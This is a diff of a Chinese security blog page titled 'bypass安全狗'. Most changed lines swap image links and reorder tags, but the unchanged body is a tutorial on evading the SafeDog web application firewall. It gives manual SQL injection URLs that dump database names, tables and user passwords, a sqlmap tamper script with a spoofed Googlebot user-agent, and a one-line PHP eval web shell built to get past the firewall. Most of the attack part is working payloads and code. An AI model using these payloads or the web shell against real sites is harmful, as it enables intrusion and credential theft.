@@ -19,19 +19,19 @@
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
 <meta property="og:description" content="绕过安全狗v4.0默认配置防护，手工过狗，编写tamper脚本使sqlmap过狗，过狗一句话">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/3982D2E7B551471C8A27A130609F9357/8901">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/5FDC0E057B4B40469802E223239DBB02/8926">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/B65FA20A849B4D96AD3500D02B31FB04/8936">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/9AFC5EAE719840878E66F214162613E4/8939">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/C17477A6006147EDB1BE65058F64EE9B/8945">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/920381E167C64C7EB4F73C1E6AB87929/8948">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/64392F705D0A4D428C0739F67E1F26FD/8955">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/0A9600ACA4D0494DB00A9C60D859AD2C/9042">
-<meta property="og:updated_time" content="2018-04-20T11:00:43.396Z">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/001.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/002.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/003.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/004.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/005.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/006.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/007.png">
+<meta property="og:image" content="http://flag0.com/img/images/bypass安全狗/008.png">
+<meta property="og:updated_time" content="2018-04-20T11:41:28.247Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bypass安全狗">
 <meta name="twitter:description" content="绕过安全狗v4.0默认配置防护，手工过狗，编写tamper脚本使sqlmap过狗，过狗一句话">
-<meta name="twitter:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/3982D2E7B551471C8A27A130609F9357/8901">
+<meta name="twitter:image" content="http://flag0.com/img/images/bypass安全狗/001.png">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -120,28 +120,27 @@
 <p>其实的50001可以用其他的五位数字替换，但是有的五位数字不生效，具体生效范围未测试</p>
 <h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p>判断注入点</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/3982D2E7B551471C8A27A130609F9357/8901" alt="image"></p>
+<p><img src="\img\images\bypass安全狗\001.png" alt="images"></p>
 <p>判断显示位</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select 1,2,3</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/5FDC0E057B4B40469802E223239DBB02/8926" alt="image"></p>
+<p><img src="\img\images\bypass安全狗\002.png" alt="images"></p>
 <p>查当前数据库名和用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select user/*!11111()*/,2,3</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/B65FA20A849B4D96AD3500D02B31FB04/8936" alt="image"></p>
-<p>查看所有的数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(schema_name),2,3 /*!11111from*/ information_schema.schemata</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/9AFC5EAE719840878E66F214162613E4/8939" alt="image"></p>
+<p><img src="\img\images\bypass安全狗\003.png" alt="images"><br>查看所有的数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(schema_name),2,3 /*!11111from*/ information_schema.schemata</span><br></pre></td></tr></table></figure></p>
+<p><img src="\img\images\bypass安全狗\004.png" alt="images"></p>
 <p>查当前数据库下表名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(table_name),2,3 /*!11111from*/ information_schema.tables where  table_schema=0x74657374</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/C17477A6006147EDB1BE65058F64EE9B/8945" alt="image"></p>
+<p><img src="\img\images\bypass安全狗\005.png" alt="images"></p>
 <p>查看列名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(column_name),2,3 /*!11111from*/ information_schema.columns where  table_name=0x7968</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/920381E167C64C7EB4F73C1E6AB87929/8948" alt="image"></p>
+<p><img src="\img\images\bypass安全狗\006.png" alt="images"></p>
 <p>查看数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(username),group_concat(password),3 /*!11111from*/ yh</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/64392F705D0A4D428C0739F67E1F26FD/8955" alt="image"></p>
+<p><img src="\img\images\bypass安全狗\007.png" alt="images"></p>
 <h2 id="编写tamper脚本"><a href="#编写tamper脚本" class="headerlink" title="编写tamper脚本"></a>编写tamper脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"> </span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"> </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&quot;UNION&quot;, &quot;/!*50001union*/&quot;).replace(&apos;FROM&apos;, &apos;/*!50001from*/&apos;).replace(&apos;()&apos;,&apos;/*!50001()*/&apos;).replace(&apos;AND&apos;,&apos;/*!50001and*/&apos;)</span><br></pre></td></tr></table></figure>
 <p>保存到sqlmap的tamper目录下</p>
 <p>使用时</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.86.129/sql/?id=1&quot; --tamper &quot;safedog.py&quot; --user-agent=&quot;Mozilla/5.0(compatible;Googlebot/2.1;+http://www.google.com/bot.html)&quot;</span><br></pre></td></tr></table></figure>
-<p>注意:sqlmap默认的user-agnet头为:<code>sqlmap/1.0.12.10#dev (http://sqlmap.org)</code><br>安全狗默认会拦截这个user-agent头<br><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/0A9600ACA4D0494DB00A9C60D859AD2C/9042" alt="image"><br>使用<code>--user-agent</code>为user-agent指定ua头即可</p>
+<p>注意:sqlmap默认的user-agnet头为:<code>sqlmap/1.0.12.10#dev (http://sqlmap.org)</code><br>安全狗默认会拦截这个user-agent头<br><img src="\img\images\bypass安全狗\008.png" alt="images"><br>使用<code>--user-agent</code>为user-agent指定ua头即可</p>
 <h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php function dog()&#123; return $_POST[1]; &#125; eval(dog()); ?&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tamper编写</span><br><span class="line">https://www.cnblogs.com/test404/p/7071868.html</span><br><span class="line">必火表哥</span><br><span class="line">http://www.xss.tv/</span><br><span class="line">http://www.nvhack.com/</span><br></pre></td></tr></table></figure>
   
@@ -247,19 +246,15 @@
 			
 		
 			
-				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
 			
 		
 			
@@ -271,7 +266,11 @@
 			
 		
 			
-				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
 			
 		
 			
@@ -279,7 +278,7 @@
 			
 		
 			
-				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
 			
 		
 			
@@ -287,7 +286,7 @@
 			
 		
 			
-				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
 			
 		
 			
@@ -299,15 +298,15 @@
 			
 		
 			
-				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
 			
 		
 		</ul>
